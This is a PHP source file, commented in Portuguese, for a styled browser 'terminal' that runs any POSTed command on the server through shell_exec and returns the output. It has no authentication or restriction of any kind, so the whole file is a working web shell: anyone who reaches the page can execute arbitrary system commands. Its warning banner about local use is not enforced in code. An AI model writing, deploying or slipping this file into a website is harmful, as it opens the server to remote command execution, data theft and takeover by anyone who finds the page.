<?php
// O backend PHP não precisa de nenhuma alteração. Continua perfeito.
session_start();

if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd();
}

if (isset($_POST['command'])) {
    header('Content-Type: text/plain');
    $command = $_POST['command'];
    
    chdir($_SESSION['cwd']);

    if (preg_match('/^cd\s*(.*)$/', $command, $matches)) {
        $newDir = trim($matches[1]);
        if (empty($newDir)) {
            $home = getenv('HOME');
            if ($home && @chdir($home)) {
                 $_SESSION['cwd'] = getcwd();
            }
        } elseif (@chdir($newDir)) {
            $_SESSION['cwd'] = getcwd();
        } else {
            echo "bash: cd: " . htmlspecialchars($newDir) . ": No such file or directory\n";
        }
    } else {
        $output = shell_exec($command . ' 2>&1');
        if (empty($output)) {
            $output = "\n"; // Garante que haja uma linha em branco para espaçamento
        } elseif (substr($output, -1) !== "\n") {
            $output .= "\n"; // Adiciona uma quebra de linha no final se não houver
        }
        echo htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP True Terminal v3.1</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --background: #0d0208; --foreground: #00ff41; --cyan: #00ffff;
            --magenta: #ff00ff; --blue: #00BFFF; --white: #f8f8f8;
            --font: 'Fira Code', monospace;
        }
        html, body { background-color: var(--background); height: 100%; margin: 0; }
        body {
            color: var(--foreground); font-family: var(--font); font-size: 16px;
            line-height: 1.5;
            background-image: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%),
                              linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
            background-size: 100% 4px, 6px 100%;
        }
        #terminal { padding: 15px; height: 100%; box-sizing: border-box; overflow-y: auto; word-wrap: break-word; }
        #terminal:focus-within .cursor { animation: blink 1s step-end infinite; }
        .line { white-space: pre-wrap; }
        .prompt-line { display: flex; align-items: center; }
        .prompt-user { color: var(--cyan); font-weight: bold; }
        .prompt-at { color: var(--white); }
        .prompt-host { color: var(--magenta); }
        .prompt-colon { color: var(--white); }
        .prompt-path { color: var(--blue); }
        .prompt-dollar { color: var(--white); margin-right: 8px; }
        .command-input {
            background-color: transparent; border: none; color: var(--foreground);
            font-family: inherit; font-size: inherit; line-height: inherit;
            flex-grow: 1; padding: 0;
        }
        .command-input:focus { outline: none; }
        .command-echo { color: var(--white); }
        .system-message { color: var(--magenta); }
        .error-message { color: #ff4141; }
        .cursor { background-color: var(--foreground); width: 9px; height: 1.2em; display: inline-block; vertical-align: middle; opacity: 1; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
        ::-webkit-scrollbar { width: 10px; }
        ::-webkit-scrollbar-track { background: #222; }
        ::-webkit-scrollbar-thumb { background: var(--cyan); border-radius: 5px; }
        ::-webkit-scrollbar-thumb:hover { background: var(--magenta); }
    </style>
</head>
<body>
    <div id="terminal">
        </div>

    <script>
        const terminal = document.getElementById('terminal');
        const welcomeMessage = `<div class="line">PHP Terminal Interface v3.1 - "The Fix"</div>
<div class="line system-message">AVISO: Ferramenta de alto risco. Use apenas em ambiente local e controlado.</div>
<div class="line">Digite <span class="command-echo">'help'</span> para ver os comandos disponíveis.</div>`;

        // Função principal que é chamada quando o usuário aperta Enter
        async function handleCommand(command, promptLine) {
            // 1. "Congela" a linha de comando atual, trocando o input por texto
            const promptText = promptLine.querySelector('.prompt-text-wrapper').innerHTML;
            promptLine.innerHTML = `${promptText}<span class="command-echo">${escapeHtml(command)}</span>`;

            // 2. Processa o comando
            if (command.toLowerCase() === 'clear') {
                terminal.innerHTML = ''; // Limpa tudo
            } else if (command.toLowerCase() === 'help') {
                const helpText = `
<div class="line"> </div>
<div class="line">Comandos do Cliente:</div>
<div class="line">  <span class="command-echo">help</span>      Mostra esta mensagem de ajuda.</div>
<div class="line">  <span class="command-echo">clear</span>     Limpa a tela do terminal.</div>
<div class="line"> </div>
<div class="line">Comandos do Servidor:</div>
<div class="line">  Qualquer outro comando (ex: <span class="command-echo">ls -la</span>) é executado no servidor.</div>
<div class="line">  O comando <span class="command-echo">cd</span> funciona para navegar entre diretórios.</div>
<div class="line"> </div>`;
                terminal.insertAdjacentHTML('beforeend', helpText);
            } else if (command) {
                const response = await sendCommand(command);
                const result = document.createElement('div');
                result.className = 'line';
                if (response.includes("No such file or directory") || response.includes("command not found")) {
                    result.classList.add('error-message');
                }
                result.textContent = response;
                terminal.appendChild(result);
            }
            
            // 3. Cria a próxima linha de comando para o usuário digitar
            await createNewPromptLine();
        }

        // Função que cria uma nova linha de comando interativa
        async function createNewPromptLine() {
            const promptLine = document.createElement('div');
            promptLine.className = 'prompt-line';
            promptLine.innerHTML = `
                <div class="prompt-text-wrapper"></div>
                <input type="text" class="command-input" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
                <div class="cursor"></div>
            `;
            terminal.appendChild(promptLine);
            
            const commandInput = promptLine.querySelector('.command-input');
            commandInput.focus();

            // Adiciona o listener de evento para a nova linha criada
            commandInput.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    this.disabled = true; // 'this' é o próprio input
                    handleCommand(this.value.trim(), this.parentElement);
                }
            });

            // Atualiza o prompt (user@host:/path$)
            await updatePrompt(promptLine);
        }
        
        // Atualiza o texto do prompt na linha de comando especificada
        async function updatePrompt(promptLine) {
            const user = (await sendCommand('whoami')).trim();
            const path = (await sendCommand('pwd')).trim();
            const host = 'localhost';
            
            const promptTextWrapper = promptLine.querySelector('.prompt-text-wrapper');
            promptTextWrapper.innerHTML = `
                <span class="prompt-user">${user}</span><span class="prompt-at">@</span><span class="prompt-host">${host}</span><span class="prompt-colon">:</span><span class="prompt-path">${path}</span><span class="prompt-dollar">$</span>
            `;
            terminal.scrollTop = terminal.scrollHeight;
        }
        
        // Funções auxiliares
        async function sendCommand(command) {
            const formData = new FormData();
            formData.append('command', command);
            try {
                const response = await fetch(window.location.href, { method: 'POST', body: formData });
                return await response.text();
            } catch (error) {
                return `Erro de comunicação: ${error}`;
            }
        }
        function escapeHtml(text) {
            const map = {'&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;'};
            return text.replace(/[&<>"']/g, m => map[m]);
        }
        
        // Função de inicialização
        function init() {
            terminal.innerHTML = welcomeMessage;
            createNewPromptLine();
        }

        init();

    </script>
</body>
</html>